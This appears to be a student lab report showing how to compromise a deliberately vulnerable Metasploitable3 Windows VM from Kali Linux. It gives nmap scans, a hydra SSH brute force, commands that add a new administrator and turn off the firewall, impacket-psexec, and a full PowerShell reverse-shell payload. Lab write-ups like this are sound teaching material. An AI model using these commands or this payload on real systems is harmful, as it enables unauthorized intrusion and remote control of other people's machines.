# Execution of simple demo of a remote and reverse shell 

##                          1. Introduction

In this report I will try to show how easy it is to obtain capabilities of controlling vulnerable windows systems through remote and  reverse shell technique.

## 2. Our Set-Up
In order to execute the demo we will need to have 2 VMs . One is  ```Kali Linux``` and another one is  ```metasploitable3``` (Windows version). I will use  ```Oracle VirtualBox``` to run both. We suppose that both systems stay in the same network. To make sure that both systems are on the same network, we must have equal network settings for both VMs.

That look like this:

![](Screenshot%201.png)

So our starting point gonna be:

![](Screenshot%202025-07-01%20000602.png)

NOTE:
In order to enter the  ```Kali Linux``` system we will need to enter  ```kali:kali``` credentials and for ```metasploitable3``` we will use  ```vagrant:vagrant``` credentials. After this we will have completly functional 2 operating systems

# 3. Discovery

To start, as an attacker (```Kali Linux User```), we first need to find or discover our victim (```Windows User```). By this I mean we need to find its IP address.

First of all we need to execute (on ```Kali Linux system```)  ```ifconfig ``` command to know own IP address 

output (only relevant part) is 
```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
inet6 fe80::4bfb:2c17:c56e:39fc  prefixlen 64  scopeid 0x20<l
```
So now we know that our IP address is ```10.0.2.15``` and netmask is  ```255.255.255.0.```
After this we have to find other hosts on the same network, to do this we execute the  ```nmap 10.0.2.0/24```command. It will take a bit of time. Output (its relevant part ) of command will give us 

 ```Nmap scan report for 10.0.2.4
Host is up (0.0011s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT      STATE SERVICE
21/tcp    open  ftp
22/tcp    open  ssh
80/tcp    open  http
4848/tcp  open  appserv-http
5985/tcp  open  wsman
8080/tcp  open  http-proxy
8383/tcp  open  m2mservices
9200/tcp  open  wap-wsp
49153/tcp open  unknown
49154/tcp open  unknown
MAC Address: 08:00:27:D7:CC:D8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
 ```
This is information about potential victim. To get more detailed information we can execute  ```nmap -sV 10.0.2.4``` and get 

 ```Nmap scan report for 10.0.2.4
Host is up (0.0011s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      Microsoft ftpd
22/tcp    open  ssh      OpenSSH 7.1 (protocol 2.0)
80/tcp    open  http     Microsoft IIS httpd 7.5
4848/tcp  open  ssl/http Oracle Glassfish Application Server
5985/tcp  open  http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8080/tcp  open  http     Sun GlassFish Open Source Edition  4.0
8383/tcp  open  http     Apache httpd
9200/tcp  open  http     Elasticsearch REST API 1.1.1 (name: Jane Foster; Lucene 4.7)
49153/tcp open  msrpc    Microsoft Windows RPC
49154/tcp open  msrpc    Microsoft Windows RPC
MAC Address: 08:00:27:D7:CC:D8 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 ```
And now we have an IP address and a list of exposed services, ports and, more importantly, the versions of the software of a victim machine. So theoretically we can analyze the list of services, find exploits for any of them and use them for attacking, but we will take an easier path.

## 4. Password Cracking

In this part we will try to crack victims credentials through remote service  ```ssh```,  using  ```hydra```. 
To do so we will execute  ```hydra -L metasploitable3-short.txt -P metasploitable3-short.txt 10.0.2.4 ssh``` . Where ```hydra``` is the name of a program for brute forcing, ```metasploitable3-short.txt``` is a prepared list of probable logins and passwords of windows systems that are not configured properly. 
So, in short, we try to find valid combinations of username and password to access via ```ssh``` ```Metasploitable3``` machine at 10.0.2.4.

The Result of this command gonna be 

 ```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-06-30 18:55:20
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 900 login tries (l:30/p:30), ~57 tries per task
[DATA] attacking ssh://10.0.2.4:22/
[22][ssh] host: 10.0.2.4   login: vagrant   password: vagrant
[22][ssh] host: 10.0.2.4   login: Administrator   password: vagrant
1 of 1 target successfully completed, 2 valid passwords found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-06-30 18:55:49 
```

## 5. Controlling Victim’s PC via SSH

So now we know, we can access via ```ssh``` victim’s computer using one of 2 credentials that ```hydra``` has found . Let's do this with  ```ssh vagrant@10.0.2.4 ```. After entering the password we have access to the victim's pc via ```ssh```.

![](Screenshot%202025-07-01%20010144.png)

We can even add a new user and make it Administrator!!! 
With a command :
 ```
net user {nama new user} {password of new user}  /add
net localgroup administrators {name of  new user} /add 
  ```
![](Screenshot%202025-07-01%20011150.png)



## 6. Taking control of Victim’s PC via Reverse shell

In this chapter I will show how to gain more or less the same control of the victim's system but using the ```Reverse shell method``` , instead of using ```ssh``` connection. 
To execute this demo we will need to enter this command in our ```ssh``` shell  ```netsh advfirewall set allprofiles state off``` . This command temporarily turns off Windows Firewall, that otherwise would not let successful execution of this demo. After this, we will use the ideal tool for this goal, that is to say  ```psexec.py``` (part of the  ```Impacket suite```, already present in Kali). The beauty of  ```psexec``` is that, if the authentication is successful, it directly provides you with an interactive shell on the target system. But before we need to start our  ```netcat listener``` in a Kali terminal (preferably in another tab) with  ```nc -lnvp 4242```

![](Screenshot%202025-07-01%20013143.png)

After this we need to, in a second Kali terminal, run  ```psexec.py``` with the credentials we found. 
With a command :
 ```impacket-psexec vagrant:vagrant@10.0.2.4 ``` (in our case )
If  ```psexec.py``` is successful, it will directly give us a Windows command prompt  (e.g. ``` C:\Windows\system32>)```. 

![](Screenshot%202025-07-01%20013708.png)
Like this

We are now in control!

(To complete the ```Reverse Shell``` demo)  From the prompt we got with  ```psexec```, we can now launch the payload for the reverse shell that will connect to your netcat listener. A common payload for Windows uses PowerShell:

 ```powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.2.15',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()" ```

By copying and pasting this entire command into the ```psexec``` prompt. We will see our netcat listener start up, giving us an interactive PowerShell shell.

![](Screenshot%202025-07-01%20014844.png)


a little example of what we can do 

![](Screenshot%202025-07-01%20014909.png)

That's all 

## REFERENCES
In order to build this demo I used the teacher's website and slides. I also got help with commands from google’s gemini


